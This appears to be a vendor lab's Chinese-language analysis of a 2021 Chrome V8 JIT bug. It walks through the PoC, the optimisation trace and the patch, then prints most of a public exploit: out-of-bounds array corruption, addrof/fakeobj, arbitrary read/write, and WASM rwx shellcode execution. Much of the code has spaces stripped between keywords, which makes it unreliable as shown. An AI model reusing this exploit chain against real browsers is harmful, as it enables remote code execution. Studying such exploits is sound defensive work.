![](https://image.3001.net/images/20210430/1619765991_608baae7e7dd494acb38b.png!small)

# ****前言****

近期，东巽科技APT防护产品铁穹，捕获到一起新型远程漏洞攻击行为（ 漏洞编号： **CNVD-2021-27989** ；漏洞威胁等级： **高危** ）。
**![](https://image.3001.net/images/20210430/1619766247_608babe73ad8377b00891.png!small)**

铁穹产品截图

东巽科技2046Lab第一时间对该告警事件进行响应，经过对攻击路径及手段进行深入分析后发现该漏洞exploit源于“@r4j0x00”2021年4月13日在twitter上公布的Chrome
0day。其存在于Chrome的Javascript引擎V8中，在关闭Chrome沙箱保护的情况下，可以造成远程代码执行。Exploit发布时该漏洞已经在最新的V8版本中修复，但是未同步到最新版本的Chrome中，打了一个时间差。

该漏洞对应的修复代码如图
![](https://image.3001.net/images/20210430/1619766298_608bac1a38824ea502e68.png!small)

该漏洞对应的修复代码如图

#  ** **漏洞环境搭建****

    
    
    git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
    echo 'export PATH=$PATH:"/path/to/depot_tools"' >> ~/.bashrc
    
    git clone https://github.com/ninja-build/ninja.git
    cd ninja && ./configure.py --bootstrap && cd ..
    
    echo 'export PATH=$PATH:"/path/to/ninja"' >> ~/.bashrc
    
    source ~/.bashrc
    fetch v8
    cd v8
    # 切换到漏洞分支
    git reset --hard 1e4b1c521a491c7487028b7f2aec550c1b36606b
    gclient sync
    # 编译debug版本
    tools/dev/v8gen.py x64.debug
    ninja -C out.gn/x64.debug
    # 编译release版本
    tools/dev/v8gen.py x64.release
    ninja -C out.gn/x64.release

#  ** **poc分析****

poc如下：

    
    
    // Copyright 2021 the V8 project authors. All rights reserved.
    // Use of this source code is governed by a BSD-style license that can be
    // found in the LICENSE file.
    
    // Flags: --allow-natives-syntax
    
    constarr = newUint32Array([2**31]);
    functionfoo() {
    return(arr[0] ^ 0) + 1;
    }
    %PrepareFunctionForOptimization(foo);
    print(foo());
    %OptimizeFunctionOnNextCall(foo);
    print(foo())

运行poc，发现优化前后的函数调用结果是不同的

![](https://image.3001.net/images/20210430/1619767625_608bb149bb788c110e4b0.png!small)

2**32 = 4294967296

2**31 = 2147483648 = 0x80000000

32位可以表示2**32个数

int32 的范围 ： [-2147483648, 2147483647]

uint32的范围： [0, 4294967296-1]

对于32位无符号数来说，2**31的最高位为1，其他位为0，在与0进行异或计算时候，因为异或计算的结果是有符号类型的，所以arr[0] ^ 0
的结果会把最高位1当成符号位，得到的结果是：-2147483648，之后加一得到最后结果-2147483647无符号到有符号的转换可以通过buffview的形式更清晰地看出来：

![](https://image.3001.net/images/20210430/1619767684_608bb184a6a41ea1cb404.png!small)

所以poc中优化过后的函数foo调用输出了错误的结果，下面需要研究函数优化过程中做了什么。v8自带了turbolizer把优化过程可视化了，可以通过下面的方式启动turbolizer：

v8自带了turbolizer把优化过程可视化了，可以通过下面的方式启动turbolizer：

cd tools/turbolizer  
sudo apt install npm  
npm i  
npm run-script build  
python -m SimpleHTTPServer # listen on 8000

重新运行一次poc，这次加上flag（--trace-turbo），会生成相关数据文件，包含turbofan优化过程的trace。

![](https://image.3001.net/images/20210430/1619767709_608bb19d2c29359609f62.png!small)

点击右上角的加载按钮上传turbo-foo-0.json文件，可以浏览不同优化阶段的节点状态。（左上角的下拉框可以选择优化阶段）

![](https://image.3001.net/images/20210430/1619767732_608bb1b41637b20faa995.png!small)

因为bug
fix是在函数ChangeInt32To64中的，我们重点关注这个节点前后的变化。观察到在EscapeAnalysis阶段到SimplifieldLowering阶段的变化，节点31的SpeculativeNumberBitwiseXor被替换成了Word32Xor，并在节点31之后插入了节点58：ChangeInt32ToInt64，这里就是ChangeInt32ToInt64被引入的地方。

![](https://image.3001.net/images/20210430/1619767764_608bb1d408989c7d35b4d.png!small)![](https://image.3001.net/images/20210430/1619767778_608bb1e2da6e25da03274.png!small)

在节点31的下方，可以看到Word32Xor的返回类型是Signed32，与之前的分析相符，也就是说节点58：ChangeInt32ToInt64的输入类型是Signed32
，之后在EarlyOptimization阶段，节点31和节点56被消除，相当于这个xor操作被优化掉了。

![](https://image.3001.net/images/20210430/1619767804_608bb1fc014310d1cd090.png!small)

此时可以看到节点58：ChangeInt32ToInt64的输入类型变成了Unsigned32（节点45:
LoadTypedElement[6]）。在漏洞函数VisitChangeInt32ToInt64中，修复之前的代码会根据输入类型决定opcode的值，如果有符号：opcode=kX64Movsxlq，无符号：opcode=kX64Movl。

kX64Movsxlq对应汇编指令movslq，会做有符号扩展

kX64Movl对应汇编指令movq，会做无符号扩展

    
    
    void InstructionSelector::VisitChangeInt32ToInt64(Node* node) {
    DCHECK_EQ(node->InputCount(), 1);
    Node* input = node->InputAt(0);
    if(input->opcode() == IrOpcode::kTruncateInt64ToInt32) {
    node->ReplaceInput(0, input->InputAt(0));
    }
    X64OperandGenerator g(this);
    Node* const value = node->InputAt(0);
    if(value->opcode() == IrOpcode::kLoad && CanCover(node, value)) {
    LoadRepresentation load_rep = LoadRepresentationOf(value->op());
    MachineRepresentation rep = load_rep.representation();
    InstructionCode opcode;
    switch(rep) {
    caseMachineRepresentation::kBit:  // Fall through.
    caseMachineRepresentation::kWord8:
    opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;
    break;
    caseMachineRepresentation::kWord16:
    opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;
    break;
    caseMachineRepresentation::kWord32:
    opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;
    // ChangeInt32ToInt64 must interpret its input as a _signed_ 32-bit
    // integer, so here we must sign-extend the loaded value in any case.
    opcode = kX64Movsxlq;

回到poc中，在优化后的函数中，2**31 ^ 0
的结果被当成了无符号数，而在从32位转成64位时又选择了movq做无符号扩展，导致了计算的最终结果是2147483649，即0x0000000080000001
，定位这个优化的位置，可以看到完成这个替换操作的是reducer MachineOperatorReducer：

    
    
    b1@dongxun:~/exp$ ~/v8/out.gn/x64.release/d8 --trace-turbo-reduction --allow-natives-syntax  poc.js
    -2147483647
    // ...
    - In-place update of #44: CheckedUint64Bounds[FeedbackSource(INVALID), 0](53, 41, 43, 67) by reducer RedundancyElimination
    - In-place update of #45: LoadTypedElement[6](39, 42, 43, 44, 44, 67) by reducer RedundancyElimination
    (这里！)- Replacement of #31: Word32Xor(45, 56) with #45: LoadTypedElement[6](39, 42, 43, 44, 44, 67) by reducer MachineOperatorReducer
    - Replacement of #93: EffectPhi(81, 81, 92) with #81: LoadElement[untagged base, 0, Unsigned32, kRepWord32|kTypeUint32, NoWriteBarrier](80, 53, 80, 76) by reducer CommonOperatorReducer
    // ...
    2147483649
    b1@dongxun:~/exp$

找到MachineOperatorReducer对应的源码，可以看到当右边节点是0时，由于任何数和0异或结果还是它本身，所以发生优化，Word32Or节点被消除：

    
    
    template<typenameWordNAdapter>
    Reduction MachineOperatorReducer::ReduceWordNOr(Node* node) {
    usingA = WordNAdapter;
    A a(this);
    
    typenameA::IntNBinopMatcher m(node);
    if(m.right().Is(0)) returnReplace(m.left().node());    // x | 0  => x （这里！！）
    if(m.right().Is(-1)) returnReplace(m.right().node());  // x | -1 => -1
    if(m.IsFoldable()) {  // K | K  => K  (K stands for arbitrary constants)
    returna.ReplaceIntN(m.left().ResolvedValue() | m.right().ResolvedValue());
    }
    if(m.LeftEqualsRight()) returnReplace(m.left().node());  // x | x => x
    
    // (x & K1) | K2 => x | K2 if K2 has ones for every zero bit in K1.
    // This case can be constructed by UpdateWord and UpdateWord32 in CSA.
    if(m.right().HasResolvedValue()) {
    if(A::IsWordNAnd(m.left())) {
    typenameA::IntNBinopMatcher mand(m.left().node());
    if(mand.right().HasResolvedValue()) {
    if((m.right().ResolvedValue() | mand.right().ResolvedValue()) == -1) {
    node->ReplaceInput(0, mand.left().node());
    returnChanged(node
    );
    }
    }
    }
    }
    
    returna.TryMatchWordNRor(node);
    }
    
    Reduction MachineOperatorReducer::ReduceWord32Or(Node* node) {
    DCHECK_EQ(IrOpcode::kWord32Or, node->opcode());
    returnReduceWordNOr<Word32Adapter>(node);
    }

#  ** **exploit 分析****

r4j0x00公布的exp在：https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js，摘取关键片段，可以看到foo函数在poc的基础上又多了一些东西，从下面的注释中可以看出到
var arr = new Array(x); 这一行之前，优化前函数中x是0，优化过的函数中x是1。

    
    
    // [...]
    const_arr = newUint32Array([2**31]);
    
    functionfoo(a) {
    varx = 1;
    x = (_arr[0] ^ 0) + 1; // -2147483647 VS 2147483649
    
    x = Math.abs(x); // 2147483647 VS 2147483649
    x -= 2147483647; // 0 VS 2
    x = Math.max(x, 0); // 0 VS 2
    
    x -= 1;    // -1 VS 1
    if(x==-1) x = 0; // 0 VS 1
    
    vararr = newArray(x);
    arr.shift(); // 造成一个length=0xFFFFFFFF的数组
    varcor = [1.1, 1.2, 1.3];
    
    return[arr, cor];
    }
    
    for(vari=0;i<0x3000;++i) // 触发对foo函数的优化
    foo(true);
    
    varx = foo(false);
    vararr = x[0];
    varcor = x[1];
    
    constidx = 6;
    arr[idx+10] = 0x4242;
    
    // [...]

这里意外出现的1会导致arr.shift的时候array字段产生一个0xFFFFFFFF的length，把arr在内存中的length字段修改成0xFFFFFFFE，造成越界读写，由于arr和cor是连续分配的，这样通过arr就可以越界访问到cor的数据结构，形成后面利用的基础。

    
    
    pwndbg> x/10gx 0x09a3081485c9-1  // arr
    0x9a3081485c8: 0x0804222d08303ab9 0xfffffffe081485bd
    0x9a3081485d8: 0x0000000608042a95 0x3ff199999999999a
    0x9a3081485e8: 0x3ff3333333333333 0x3ff4cccccccccccd
    0x9a3081485f8: 0x0804222d08303ae1 0x00000006081485d9
    0x9a308148608: 0x0000000408042205 0x081485f9081485c9
    pwndbg> x/10gx 0x09a3081485f9-1 // cor
    0x9a3081485f8: 0x0804222d08303ae1 0x00000006081485d9
    0x9a308148608: 0x0000000408042205 0x081485f9081485c9
    0x9a308148618: 0x0804222d08303b31 0x0000000408148609
    0x9a308148628: 0xbeadbeefbeadbeef 0xbeadbeefbeadbeef
    0x9a308148638: 0xbeadbeefbeadbeef 0xbeadbeefbeadbeef

有了越界读写，下一步就是构造addrof和fakeobj，通过arr读写cor的指针来做到这点：

    
    
    constidx = 6;
    functionaddrof(k) {
    arr[idx+1] = k;
    returnftoi(cor[0]) & 0xffffffffn;
    }
    
    functionfakeobj(k) {
    cor[0] = itof(k);
    returnarr[idx+1];
    }

为了更好理解，首先看看一个简单的Array （var simple = new Array([1,2,3])）在内存中的布局规律：

![](https://image.3001.net/images/20210430/1619767868_608bb23c929ddd1194f5f.png!small)

有几个需要注意的点：

▸v8中使用了 pointer tagging， 指针的最后一位为1作为标记用，实际查看时需要减一

▸数字（smi）是左移一位后存放在内存中的，所以上图中的length 3被存为0x6

▸由于指针压缩的存在，只保存指针的低32位，高32位保存在寄存器中。所以上图中的elements指针字段只用了32位

在addrof中，通过用arr越界写到cor的elements指针地址offset
0x8的位置，通过cor[0]访问到的数据就是刚刚写入的数据，以此进行对象和浮点数据的混淆，fakeobj同理。

![](https://image.3001.net/images/20210430/1619767899_608bb25b55cde525b4c7c.png!small)

后面进一步构造任意地址读写原语：使用fakeobj在arr2偏移0x20处伪造一个object叫做fake，使得fake的element指针可以通过arr2[1]访问，这样，读写这个指针，就实现了任意地址读写。

    
    
    varfloat_array_map = ftoi(cor[3]);  // cor[3] 's addr = arr
    
    vararr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
    varfake = fakeobj(addrof(arr2) + 0x20n);
    
    functionarbread(addr) {
    if(addr % 2n == 0) {
    addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return(fake[0]);
    }
    
    functionarbwrite(addr, val) {
    if(addr % 2n == 0) {
    addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
    }

最后就是这类漏洞的常规利用方式，找到WASM的rwx区域，写入shellcode并执行。

    
    
    varwasm_code = newUint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
    varwasm_mod = newWebAssembly.Module(wasm_code);
    varwasm_instance = newWebAssembly.Instance(wasm_mod);
    varf = wasm_instance.exports.main;
    functioncopy_shellcode(addr, shellcode) {
    letdataview = newDataView(buf2);
    letbuf_addr = addrof(buf2);
    letbacking_store_addr = buf_addr + 0x14n;
    arbwrite(backing_store_addr, addr);
    
    for(leti = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
    }
    }
    
    varrwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
    console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
    
    varshellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    copy_shellcode(rwx_page_addr, shellcode);
    f();

在Ubuntu20.04上运行exp效果如下：

![](https://image.3001.net/images/20210430/1619767927_608bb277b6bb0e0ed487c.png!small)

#  ** **参考链接****

  * https://chromium-review.googlesource.com/c/v8/v8/+/2820971
  * https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js
  * https://v8.dev/blog/pointer-compression
  * https://www.yuque.com/docs/share/97382c2b-911f-488c-8cc5-1c00bb932576

